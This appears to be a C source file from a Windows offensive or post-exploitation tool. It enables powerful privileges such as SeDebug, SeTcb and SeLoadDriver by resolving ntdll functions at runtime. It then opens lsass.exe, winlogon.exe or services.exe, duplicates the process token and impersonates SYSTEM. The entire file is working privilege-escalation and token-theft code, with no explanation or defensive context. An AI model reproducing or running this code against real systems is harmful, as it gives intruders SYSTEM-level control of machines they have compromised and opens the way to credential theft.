
// #include "gate.h"
#include "gate.h"
#include "lsass.h"
#include <stdbool.h>
#include <windows.h>

#include "token.h"

#include <stdio.h>
#include <string.h>

static RtlAdjustPrivilege_t RtlAdjustPrivilegePtr = NULL;

NTSTATUS privilege(ULONG priv) {
  BOOLEAN prev;
  if (RtlAdjustPrivilegePtr == NULL) {
    size_t ntdll = get_mod_base("ntdll.dll");
    const void *adjustPtr =
        get_function_from_exports(ntdll, "RtlAdjustPrivilege");
    RtlAdjustPrivilegePtr = (RtlAdjustPrivilege_t)adjustPtr;
  }
  NTSTATUS status = RtlAdjustPrivilegePtr(priv, TRUE, FALSE, &prev);
  return status;
}

Command TokenCommand(const char *str) {
  if (strcmp(str, "debug") == 0)
    return DEBUG;
  if (strcmp(str, "impersonate") == 0)
    return IMPERSONATE;
  if (strcmp(str, "backup") == 0)
    return BACKUP;
  if (strcmp(str, "tcb") == 0)
    return TCB;
  if (strcmp(str, "takeownership") == 0)
    return TAKEOWNERSHIP;
  if (strcmp(str, "loaddriver") == 0)
    return LOADDRIVER;
  if (strcmp(str, "createtoken") == 0)
    return CREATETOKEN;
  if (strcmp(str, "security") == 0)
    return SECURITY;
  if (strcmp(str, "relabel") == 0)
    return RELABEL;
  return UNKNOWN_COMMAND;
}

NTSTATUS EnablePrivilege(char *privilegeStr) {
  Command cmd = TokenCommand(privilegeStr);
  switch (cmd) {
  case DEBUG:
    return privilege(20);
  case IMPERSONATE:
    return privilege(29);
  case BACKUP:
    return privilege(17);
  case TCB:
    return privilege(7);
  case TAKEOWNERSHIP:
    return privilege(9);
  case LOADDRIVER:
    return privilege(10);
  case CREATETOKEN:
    return privilege(2);
  case SECURITY:
    return privilege(8);
  case RELABEL:
    return privilege(32);
  default:
    return STATUS_INVALID_PARAMETER;
  }
  return 1;
}

// returns handle pid
HANDLE GetProcessByName(WCHAR *procname) {
  HANDLE procFound = NULL;
  size_t ntdll = get_mod_base("ntdll.dll");
  PVOID buffer = NULL;
  DWORD bufSize = 0;

  const void *queryInfoPtr =
      get_function_from_exports(ntdll, "NtQuerySystemInformation");
  NtQuerySystemInformation_t NtQuerySystemInformation =
      (NtQuerySystemInformation_t)queryInfoPtr;
  const void *allocVirtPtr =
      get_function_from_exports(ntdll, "NtAllocateVirtualMemory");
  NtAllocateVirtualMemory_t NtAllocateVirtualMemory =
      (NtAllocateVirtualMemory_t)allocVirtPtr;
  const void *freeVirtPtr =
      get_function_from_exports(ntdll, "NtFreeVirtualMemory");
  NtFreeVirtualMemory_t NtFreeVirtualMemory =
      (NtFreeVirtualMemory_t)freeVirtPtr;

  NTSTATUS status =
      NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)5, 0, 0, &bufSize);
  if (bufSize == 0) {
    return NULL;
  }
  size_t bufSizeT = (size_t)bufSize;
  status = NtAllocateVirtualMemory(GetCurrentProcess(), &buffer, 0, &bufSizeT,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!status) {
    SYSTEM_PROCESS_INFORMATION *sysproc_info =
        (SYSTEM_PROCESS_INFORMATION *)buffer;
    if (!NtQuerySystemInformation(
            (SYSTEM_INFORMATION_CLASS)SystemProcessInformation, buffer, bufSize,
            &bufSize)) {
      while (TRUE) { // query process info
        if (lstrcmpiW(procname, sysproc_info->ImageName.Buffer) == 0) {
          procFound = sysproc_info->UniqueProcessId;
          break;
        }
        if (!sysproc_info->NextEntryOffset) {
          break;
        }
        sysproc_info =
            (SYSTEM_PROCESS_INFORMATION *)((ULONG_PTR)sysproc_info +
                                           sysproc_info->NextEntryOffset);
      }
    }

  } else {
    printf("failed to allocate virtual memory: 0x%08lX\n", status);
    return procFound;
  }
  NtFreeVirtualMemory(GetCurrentProcess(), &buffer, &bufSizeT, MEM_RELEASE);

  return procFound;
}

#define InitializeObjectAttributes(p)                                          \
  (p)->Length = sizeof(OBJECT_ATTRIBUTES);                                     \
  (p)->RootDirectory = NULL;                                                   \
  (p)->Attributes = 0;                                                         \
  (p)->ObjectName = NULL;                                                      \
  (p)->SecurityDescriptor = NULL;                                              \
  (p)->SecurityQualityOfService = NULL;
const NTSTATUS STATUS_SUCCESS = 0x00000000;
NTSTATUS ImpersonateSystem() {
  EnablePrivilege("debug");
  WCHAR *procNames[3] = {L"lsass.exe", L"winlogon.exe", L"services.exe"};
  size_t ntdll = get_mod_base("ntdll.dll");
  NtOpenProcess_t NtOpenProcess =
      (NtOpenProcess_t)get_function_from_exports(ntdll, "NtOpenProcess");
  NtOpenProcessToken_t NtOpenProcessToken =
      (NtOpenProcessToken_t)get_function_from_exports(ntdll,
                                                      "NtOpenProcessToken");
  NtDuplicateToken_t NtDuplicateToken =
      (NtDuplicateToken_t)get_function_from_exports(ntdll, "NtDuplicateToken");
  HANDLE procFound = NULL;
  for (int i = 0; i < 3; i++) {
    procFound = GetProcessByName(procNames[i]);
    if (procFound != NULL) {
      printf("found a process running as system: %p\n", procFound);
      CLIENT_ID cid;
      OBJECT_ATTRIBUTES objAttr;
      // DWORD pid = GetProcessId(procFound);

      cid.UniqueProcess = procFound;
      cid.UniqueThread = NULL;
      InitializeObjectAttributes(&objAttr);
      HANDLE hProcess = NULL;
      NTSTATUS status =
          NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
      if (status != STATUS_SUCCESS) {
        continue;
      }
      HANDLE token = NULL;
      status =
          NtOpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &token);
      if (status != STATUS_SUCCESS) {
        printf("failed to open process token.\n");
        continue;
      }
      OBJECT_ATTRIBUTES tokenAttr;
      InitializeObjectAttributes(&tokenAttr);
      printf("opened token for: %p\n", procFound);
      HANDLE duplicateToken = NULL;
      status = NtDuplicateToken(token, TOKEN_ALL_ACCESS, &tokenAttr,
                                SecurityImpersonation, TokenPrimary,
                                &duplicateToken);
      if (status != STATUS_SUCCESS) {
        printf("failed to duplciate token.\n");
        continue;
      }
      printf("token: %p\n", duplicateToken);
      BOOL result = ImpersonateLoggedOnUser(duplicateToken);
      if (result != 0) {
        printf("impersonated!\n");
        return status;
      }
    }
  }

  return CIP_ACCESS_DENIED;
};
